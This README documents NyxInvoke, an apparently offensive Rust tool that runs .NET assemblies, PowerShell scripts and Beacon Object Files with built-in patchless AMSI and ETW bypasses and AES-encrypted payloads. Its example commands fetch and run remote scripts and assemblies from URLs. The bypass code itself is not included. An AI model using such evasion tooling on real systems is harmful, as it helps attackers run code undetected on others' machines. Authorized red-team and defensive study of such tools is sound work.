# NyxInvoke

NyxInvoke is a versatile command-line tool designed for executing .NET assemblies, PowerShell commands/scripts, and Beacon Object Files (BOFs) with built-in patchless AMSI and ETW bypass capabilities.

## Features

- Execute .NET assemblies
- Run PowerShell commands or scripts
- Load and execute Beacon Object Files (BOFs)
- Built-in patchless AMSI (Anti-Malware Scan Interface) bypass
- Built-in patchless ETW (Event Tracing for Windows) bypass
- Support for encrypted payloads with AES decryption
- Flexible input options: local files, URLs, or compiled-in data

## Usage

NyxInvoke supports three main modes of operation:

1. CLR Mode (.NET assembly execution)
2. PowerShell Mode
3. BOF Mode (Beacon Object File execution)

### General Syntax

```
NyxInvoke.exe <mode> [OPTIONS]
```

Where `<mode>` is one of: `clr`, `ps`, or `bof`.

### Common Options

- `--base <BASE_URL_OR_PATH>`: Base URL or path for resources
- `--key <KEY_FILENAME_OR_URL>`: AES key file or URL
- `--iv <IV_FILENAME_OR_URL>`: AES IV file or URL

### Mode-Specific Options

1. CLR Mode:
   - `--assembly <ASSEMBLY_FILENAME_OR_URL>`: .NET assembly file or URL
   - `--args <ARGS>...`: Arguments for the executable

2. PowerShell Mode:
   - `--command <COMMAND>`: PowerShell command to execute
   - `--script <SCRIPT_PATH_OR_URL>`: PowerShell script file or URL

3. BOF Mode:
   - `--bof <BOF_FILENAME_OR_URL>`: BOF file or URL
   - `--args <ARGS>...`: Arguments for the BOF

## Examples

### CLR Mode

1. Remote Execution:
   ```
   NyxInvoke.exe clr --base https://example.com/resources --key clr_aes.key --iv clr_aes.iv --assembly clr_data.enc --args arg1 arg2
   ```

2. Local Execution:
   ```
   NyxInvoke.exe clr --key C:\path\to\clr_aes.key --iv C:\path\to\clr_aes.iv --assembly C:\path\to\clr_data.enc --args arg1 arg2
   ```

3. Compiled Execution:
   ```
   NyxInvoke.exe clr --args arg1 arg2
   ```

### PowerShell Mode

1. Remote Script Execution:
   ```
   NyxInvoke.exe ps --script https://example.com/script.ps1
   ```

2. Local Script Execution:
   ```
   NyxInvoke.exe ps --script C:\path\to\script.ps1
   ```

3. Direct Command Execution:
   ```
   NyxInvoke.exe ps --command "Get-Process | Select-Object Name, ID"
   ```

### BOF Mode

1. Remote Execution:
   ```
   NyxInvoke.exe bof --base https://example.com/resources --key bof_aes.key --iv bof_aes.iv --bof bof_data.enc --args "str=argument1" "int=42"
   ```

2. Local Execution:
   ```
   NyxInvoke.exe bof --key C:\path\to\bof_aes.key --iv C:\path\to\bof_aes.iv --bof C:\path\to\bof_data.enc --args "str=argument1" "int=42"
   ```

3. Compiled Execution:
   ```
   NyxInvoke.exe bof --args "str=argument1" "int=42"
   ```

## Test Resources

In the `resources` directory, you'll find several files to test NyxInvoke's functionality:

1. Encrypted CLR Assembly (Seatbelt):
   - File: `clr_data.enc`
   - Description: An encrypted version of the Seatbelt tool, a C# project for gathering system information.
   - Usage example:
     ```
     NyxInvoke.exe clr --key resources/aes.key --iv resources/aes.iv --assembly resources/clr_data.enc --args AntiVirus
     ```

2. Encrypted BOF (Directory Listing):
   - File: `bof_data.enc`
   - Description: An encrypted Beacon Object File that executes the 'dir' command.
   - Usage example:
     ```
     NyxInvoke.exe bof --key resources/aes.key --iv resources/aes.iv --bof resources/bof_data.enc --args "wstr=C:\\Windows"
     ```


## Building

To build NyxInvoke with compiled-in CLR or BOF data:

```
cargo +nightly build --release --target=x86_64-pc-windows-msvc
```
or
```
cargo +nightly build --release --features=compiled_bof,compiled_clr
```

## Dependencies

- Rust 1.55 or later
- Various Rust crates (see `Cargo.toml`)

## Notes

- Supports AES decryption for encrypted payloads.
- Can load resources from local files, URLs, or use compiled-in data.
- For BOF arguments, use the format "type=value". Supported types: str, wstr, int, short, bin (base64 encoded).

## Legal Notice

This tool is for educational and authorized testing purposes only. Ensure you have proper permissions before use in any environment.

